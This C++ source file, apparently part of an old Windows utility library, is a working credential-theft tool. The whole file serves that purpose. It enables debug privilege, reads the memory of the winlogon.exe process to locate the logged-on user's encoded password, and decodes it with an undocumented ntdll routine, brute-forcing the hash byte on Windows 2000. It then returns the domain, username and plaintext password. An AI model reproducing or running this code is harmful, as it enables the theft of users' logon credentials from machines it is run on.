/*******************************************************************
   *	Wutils.cpp
   *    DESCRIPTION:windows系统工具函数集
   *    查找登录密码
   *    AUTHOR:yyc
   *
   *    http://hi.baidu.com/yycblog/home
   *
   *    DATE:2005-09-19
   *
   *******************************************************************/

#include "Wutils.h"

#include <stdio.h>

//private struct for this file************
//****************************************
typedef struct _UNICODE_STRING 
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _ENCODED_PASSWORD_INFO
{
	DWORD HashByte;
	DWORD Unk04;
	DWORD Unk08;
	DWORD Unk0C;
	FILETIME LoggedOn;
	DWORD Unk18;
	DWORD Unk1C;
	DWORD Unk20;
	DWORD Unk24;
	DWORD Unk28;
	UNICODE_STRING EncodedPassword;
} ENCODED_PASSWORD_INFO, *PENCODED_PASSWORD_INFO;
//private struct end for this file************
//********************************************

// Private Prototypes
BOOL LocatePasswordPageWinNT (DWORD, PDWORD);
BOOL LocatePasswordPageWin2K (DWORD, PDWORD);
void DisplayPasswordWinNT (DWORD PasswordLength,char *retbuf);
void DisplayPasswordWin2K (DWORD PasswordLength,char *retbuf);

//私有全局数据***************************************
DWORD PasswordLength = 0;
PVOID RealPasswordP = NULL;
PVOID PasswordP = NULL;
DWORD HashByte = 0;
wchar_t UserName [0x400];
wchar_t UserDomain [0x400];

//strAccount -- 格式Domain\account或者Domain/account
BOOL Wutils :: FindPassword(const char *ptr)
{
	if(ptr==NULL || ptr[0]==0)
		return FindPassword(NULL,NULL);

	const char *ptrDomain=ptr,*ptrAccount=NULL;
	while(*ptr) if(*ptr=='\\' || *ptr=='/'){ ptrAccount=ptr; break; } else ptr++;
	if(ptrAccount){ 
		*(char *)ptrAccount=0; 
		ptrAccount++; 
	}else { ptrAccount=ptrDomain;  ptrDomain=NULL; }
	return FindPassword(ptrDomain,ptrAccount);
}
//获取Win2K/NT的系统登录帐号信息(username & password)
//[in] strDomain ---查找指定域
//[in] strAccount -- 查找指定帐号
//返回<0发生错误 =0未找到密码 否则找到密码
BOOL Wutils :: FindPassword(const char *strDomain,const char *strAccount)
{
	MSOSTYPE ost=Wutils::winOsType();

	if(ost<MSOS_TYPE_NT) //非NT或Win2000系统
	{
		sprintf(m_buffer,"NT/WIN2K are required!");
		return FALSE;
	}
	// Add debug privilege 
	// this is needed for the search for Winlogon.
	if(!Wutils::EnablePrivilege(SE_DEBUG_NAME,true))
	{
		sprintf(m_buffer,"no privilege!");
		return FALSE;
	}
	// Locate WinLogon's PID - need debug privilege and admin rights.
	DWORD WinLogonPID =Wutils::GetPIDFromName("winlogon.exe");

	if (WinLogonPID == 0)
	{
		sprintf(m_buffer,"failed to find WinLogon!");
		return FALSE;
	}
	
	// Set values to check memory block against.
	memset(UserName, 0, sizeof(UserName));
	memset(UserDomain, 0, sizeof(UserDomain));
	if(strDomain)
		swprintf(UserDomain,L"%S",strDomain);
	else
	{
		//以服务方式运行时将不能获得用户名和域名，因为服务和用户无关
		//通过环境变量获得用户名和域名
		if(::GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400)==0)
			swprintf(UserDomain,L"%S",Wutils::computeName());
	}
	if(strAccount)
		swprintf(UserName,L"%S",strAccount);
	else
	{	//此时如果用::GetUserName获取得到的是SYSTEM
		if(::GetEnvironmentVariableW(L"USERNAME", UserName, 0x400)==0)
			swprintf(UserName,L"%S","Administrator");
	}//?if(strAccount)...else

	BOOL FoundPasswordPage=FALSE;
	//在winlogon进程内存空间定位包含密码的内存块
	// Locate the block of memory containing 
	// the password in WinLogon's memory space.
	if (ost!=MSOS_TYPE_NT)
		FoundPasswordPage =LocatePasswordPageWin2K(WinLogonPID, &PasswordLength);
	else
		FoundPasswordPage =LocatePasswordPageWinNT(WinLogonPID, &PasswordLength);
	if (FoundPasswordPage)
	{
		if (PasswordLength == 0)
		{
			sprintf(m_buffer,"%S/%S",UserDomain,UserName);
		}
		else
		{
			// Decode the password string.
			if (ost!=MSOS_TYPE_NT)
				DisplayPasswordWin2K(PasswordLength,m_buffer);
			else
				DisplayPasswordWinNT(PasswordLength,m_buffer);
		}
		return TRUE;
	}//?if (FoundPasswordPage)
	else
		sprintf(m_buffer,"failed to find password (%S/%S) in memory!",UserDomain,UserName);
	
	return FALSE;
}

//****************************************************************************
//**********************private function for this file************************
//******************************* start **************************************

BOOL LocatePasswordPageWin2K(DWORD WinLogonPID,PDWORD PasswordLength)
{
#define USER_DOMAIN_OFFSET_WIN2K	0x400
#define USER_PASSWORD_OFFSET_WIN2K	0x800
	HANDLE WinLogonHandle =OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, WinLogonPID);
	if (WinLogonHandle == 0) return FALSE;
	
	*PasswordLength = 0;
	SYSTEM_INFO SystemInfo;
	GetSystemInfo(&SystemInfo);
	DWORD i = (DWORD) SystemInfo.lpMinimumApplicationAddress;
	DWORD MaxMemory = (DWORD) SystemInfo.lpMaximumApplicationAddress;
	DWORD Increment = SystemInfo.dwPageSize;
	MEMORY_BASIC_INFORMATION MemoryBasicInformation;
	while (i < MaxMemory)
	{
		if (VirtualQueryEx(WinLogonHandle,(PVOID) i,&MemoryBasicInformation,sizeof (MEMORY_BASIC_INFORMATION)))
		{
			Increment = MemoryBasicInformation.RegionSize;
			if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT)
					&&
				((MemoryBasicInformation.Protect & PAGE_GUARD) == 0))
			{
				PVOID RealStartingAddressP =HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,MemoryBasicInformation.RegionSize);
				DWORD BytesCopied = 0;
				if (ReadProcessMemory(WinLogonHandle,(PVOID)i,RealStartingAddressP,MemoryBasicInformation.RegionSize,&BytesCopied))
				{
					if ((_wcsicmp ((wchar_t *) RealStartingAddressP, UserName) == 0)
							&&
						(_wcsicmp ((wchar_t *) ((DWORD) RealStartingAddressP + USER_DOMAIN_OFFSET_WIN2K), UserDomain) == 0))
					{
						RealPasswordP = (PVOID) (i + USER_PASSWORD_OFFSET_WIN2K);
						PasswordP = (PVOID) ((DWORD) RealStartingAddressP + USER_PASSWORD_OFFSET_WIN2K);
						// Calculate the length of encoded unicode string.
						PBYTE p = (PBYTE) PasswordP;
						DWORD Loc = (DWORD) p;
						DWORD Len = 0;
						if ((*p == 0)&&(* (PBYTE) ((DWORD) p + 1) == 0))
							;
						else
							do
							{
								Len++;
								Loc += 2;
								p = (PBYTE) Loc;
							} while(*p != 0);
						*PasswordLength = Len;
						CloseHandle(WinLogonHandle);
						return (TRUE);
					}
				}
				HeapFree(GetProcessHeap(),0,RealStartingAddressP);
			}
		}
		else
			Increment = SystemInfo.dwPageSize;
		// Move to next memory block.
		i += Increment;
	}
	CloseHandle(WinLogonHandle);
	return (FALSE);
} // LocatePasswordPageWin2K

BOOL LocatePasswordPageWinNT (DWORD WinLogonPID, PDWORD PasswordLength)
{
#define USER_DOMAIN_OFFSET_WINNT	0x200
#define USER_PASSWORD_OFFSET_WINNT	0x400
	
	HANDLE WinLogonHandle =OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, WinLogonPID);
	if (WinLogonHandle == 0) return (FALSE);

	*PasswordLength = 0;
	SYSTEM_INFO SystemInfo;
	GetSystemInfo(&SystemInfo);
	DWORD PEB = 0x7ffdf000; 
	DWORD BytesCopied = 0;
	PVOID PEBP =HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,SystemInfo.dwPageSize);
	if (!ReadProcessMemory(WinLogonHandle,(PVOID)PEB,PEBP,SystemInfo.dwPageSize,&BytesCopied))
	{
		CloseHandle(WinLogonHandle);
		return FALSE;
	}
	BOOL rc = FALSE;
	// Grab the value of the 2nd DWORD in the TEB.
	PDWORD WinLogonHeap = (PDWORD) ((DWORD) PEBP + (6 * sizeof (DWORD)));
	MEMORY_BASIC_INFORMATION MemoryBasicInformation;
	if (VirtualQueryEx(WinLogonHandle,(PVOID) *WinLogonHeap,&MemoryBasicInformation,sizeof(MEMORY_BASIC_INFORMATION)))
		if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT)
				&&
			((MemoryBasicInformation.Protect & PAGE_GUARD) == 0))
		{
			PVOID WinLogonMemP = HeapAlloc(GetProcessHeap (),HEAP_ZERO_MEMORY,MemoryBasicInformation.RegionSize);
			if (ReadProcessMemory
					(WinLogonHandle,
					(PVOID) *WinLogonHeap,
					WinLogonMemP,
					MemoryBasicInformation.RegionSize,
					&BytesCopied))
			{
				DWORD i = (DWORD) WinLogonMemP;
				DWORD UserNamePos = 0;
				// The order in memory is UserName followed by the UserDomain.
				do
				{
					if ((_wcsicmp (UserName, (wchar_t *) i) == 0)
							&&
						(_wcsicmp (UserDomain, (wchar_t *) (i + USER_DOMAIN_OFFSET_WINNT)) == 0))
					{
						UserNamePos = i;
						break;
					}
					i += 2;
				} while (i < (DWORD) WinLogonMemP + MemoryBasicInformation.RegionSize);
				if (UserNamePos)
				{
					PENCODED_PASSWORD_INFO EncodedPasswordInfoP =
						(PENCODED_PASSWORD_INFO)
						((DWORD) UserNamePos + USER_PASSWORD_OFFSET_WINNT);
					//FILETIME LocalFileTime;
					//SYSTEMTIME SystemTime;
					//if (FileTimeToLocalFileTime(&EncodedPasswordInfoP->LoggedOn,&LocalFileTime))
					//	if (FileTimeToSystemTime(&LocalFileTime,&SystemTime))
					//		RW_LOG_DEBUG 
					//			("You logged on at %d/%d/%d %d:%d:%d\n",
					//			SystemTime.wMonth,
					//			SystemTime.wDay,
					//			SystemTime.wYear,
					//			SystemTime.wHour,
					//			SystemTime.wMinute,
					//			SystemTime.wSecond);//在NT下打印登录时间

					*PasswordLength = (EncodedPasswordInfoP->EncodedPassword.Length & 0x00ff) / sizeof (wchar_t);
					HashByte = (EncodedPasswordInfoP->EncodedPassword.Length & 0xff00) >> 8;
					RealPasswordP = (PVOID) (*WinLogonHeap + 
							(UserNamePos - (DWORD) WinLogonMemP) + 
							USER_PASSWORD_OFFSET_WINNT + 0x34);
					PasswordP = (PVOID) ((PBYTE) (UserNamePos + USER_PASSWORD_OFFSET_WINNT + 0x34));
					rc = TRUE;
				}
			}
		}

	HeapFree(GetProcessHeap (),0,PEBP);
	CloseHandle(WinLogonHandle);
	return rc;
} // LocatePasswordPageWinNT 


//函数指针声明 only for DisplayPasswordWinNT or DisplayPasswordWin2K
typedef void (__stdcall *PFNTRTLRUNDECODEUNICODESTRING)  (BYTE, PUNICODE_STRING);
void DisplayPasswordWinNT(DWORD PasswordLength,char *retbuf)
{
	PFNTRTLRUNDECODEUNICODESTRING pfnRtlRunDecodeUnicodeString;
	HINSTANCE hNtDll = ::LoadLibrary("NTDLL.DLL");
	if(hNtDll==NULL) {sprintf(retbuf,"failed to LoadLibrary!"); return;}
	pfnRtlRunDecodeUnicodeString =
		(PFNTRTLRUNDECODEUNICODESTRING) GetProcAddress 
			(hNtDll, 
			"RtlRunDecodeUnicodeString");
	//----------------------------------------------------------
	UNICODE_STRING EncodedString;
	EncodedString.Length = (WORD) PasswordLength * sizeof (wchar_t);
	EncodedString.MaximumLength = ((WORD) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t);
	EncodedString.Buffer = (PWSTR) HeapAlloc(GetProcessHeap (),HEAP_ZERO_MEMORY,EncodedString.MaximumLength);
	CopyMemory(EncodedString.Buffer, PasswordP, PasswordLength * sizeof (wchar_t));
	// Finally - decode the password.
	// Note that only one call is required since the hash-byte
	// was part of the orginally encoded string.
	pfnRtlRunDecodeUnicodeString((BYTE) HashByte, &EncodedString);

	sprintf(retbuf,"%S/%S/%S",UserDomain,UserName,EncodedString.Buffer);
	//RW_LOG_DEBUG("[LOGONINFO] The logon information is: %s.\n", buf);
	//RW_LOG_DEBUG("[LOGONINFO] The hash byte is: 0x%2.2x.\n", HashByte);
	HeapFree(GetProcessHeap (),0,EncodedString.Buffer);
	//--------------------------------------------------
	if(hNtDll!=NULL) FreeLibrary(hNtDll);

} // DisplayPasswordWinNT

void DisplayPasswordWin2K(DWORD PasswordLength,char *retbuf)
{
	PFNTRTLRUNDECODEUNICODESTRING pfnRtlRunDecodeUnicodeString;
	HINSTANCE hNtDll = ::LoadLibrary("NTDLL.DLL");
	if(hNtDll==NULL) {sprintf(retbuf,"failed to LoadLibrary!"); return;}
	pfnRtlRunDecodeUnicodeString =
		(PFNTRTLRUNDECODEUNICODESTRING) GetProcAddress 
			(hNtDll, 
			"RtlRunDecodeUnicodeString");
	//----------------------------------------------------------
	DWORD i, Hash = 0;
	UNICODE_STRING EncodedString;
	EncodedString.Length = (USHORT) PasswordLength * sizeof (wchar_t);
	EncodedString.MaximumLength = ((USHORT) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t);
	EncodedString.Buffer =(PWSTR) HeapAlloc(GetProcessHeap (),HEAP_ZERO_MEMORY,EncodedString.MaximumLength);
	// This is a brute force technique since the hash-byte
	// is not stored as part of the encoded string - :>(.
	sprintf(retbuf,"%S/%S/",UserDomain,UserName);
	//RW_LOG_DEBUG(strInfo.c_str());
	for (i = 0; i <= 0xff; i++)
	{
		CopyMemory(EncodedString.Buffer, PasswordP, PasswordLength * sizeof (wchar_t));
		// Finally - try to decode the password.
		pfnRtlRunDecodeUnicodeString((BYTE) i, &EncodedString);
		// Check for a viewable password.
		PBYTE p = (PBYTE) EncodedString.Buffer;
		BOOL Viewable = TRUE;
		DWORD j, k;

		for (j = 0; (j < PasswordLength) && Viewable; j++)
		{
			if ((*p)&&(* (PBYTE)(DWORD (p) + 1) == 0))
			{
				if (*p < 0x20)
					Viewable = FALSE;
				if (*p > 0x7e)
					Viewable = FALSE;
			}
			else
				Viewable = FALSE;
			k = DWORD (p);
			k++; k++;
			p = (PBYTE) k;
		}
		if (Viewable)
		{
			sprintf(retbuf,"%S/%S/%S",UserDomain,UserName,EncodedString.Buffer);
			break;
		}
	}//?for
	//RW_LOG_DEBUG("[LOGONINFO] The logon information is: %s.\n", strInfo.c_str());
	HeapFree(GetProcessHeap (),0,EncodedString.Buffer);
	//--------------------------------------------------
	if(hNtDll!=NULL) FreeLibrary(hNtDll);
} // DisplayPasswordWin2K

//******************************* end ****************************************
//**********************private function for this file************************
//****************************************************************************
